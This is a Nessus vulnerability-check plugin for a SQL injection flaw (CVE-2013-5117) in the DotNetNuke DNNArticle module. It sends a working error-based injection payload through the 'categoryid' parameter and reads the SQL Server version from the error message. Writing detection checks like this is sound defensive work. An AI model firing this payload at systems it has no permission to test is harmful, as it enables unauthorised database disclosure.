#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69430);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/10/20 19:40:17 $");

  script_cve_id("CVE-2013-5117");
  script_bugtraq_id(61788);
  script_osvdb_id(96306);
  script_xref(name:"EDB-ID", value:"27602");

  script_name(english:"DNN (DotNetNuke) DNNArticle Module categoryid Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'categoryid' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP.NET application that is affected
by a SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of DNN installed on the remote host is affected by a SQL
injection vulnerability due to a failure to properly sanitize
user-supplied input to the 'categoryid' parameter of the
'dnnarticlerss.aspx' script. A remote, unauthenticated attacker can
leverage this issue to launch a SQL injection attack against the
affected application. This could lead to authentication bypass, 
discovery of sensitive information, or attacks against the underlying 
database.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/08/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dotnetnuke:dotnetnuke");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("dotnetnuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/DNN");
  exit(0);
}

include("audit.inc");
include("misc_func.inc");
include("global_settings.inc");
include("http.inc");
include("install_func.inc");

app = "DNN";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, asp:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

url = "/desktopmodules/dnnarticle/dnnarticlerss.aspx?moduleid=0&categoryid=" +
  "1+or+1=@@VERSION";

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE
);
output = res[2];

if (
  (res[0] =~ "^HTTP/[0-9.]+ 200 OK") &&
  ("Conversion failed when converting the nvarchar" >< output) &&
  (ereg(pattern:"SQL Server", string:output, multiline:TRUE, icase:TRUE))
)
{
  # Extract version info for report
  output = strstr(output, "Microsoft");
  pos = stridx(output, '\n');
  output = substr(output, 0, pos-1);
  if (isnull(output)) output = res[2];

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(install_url + url),
    output     : output
  );
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
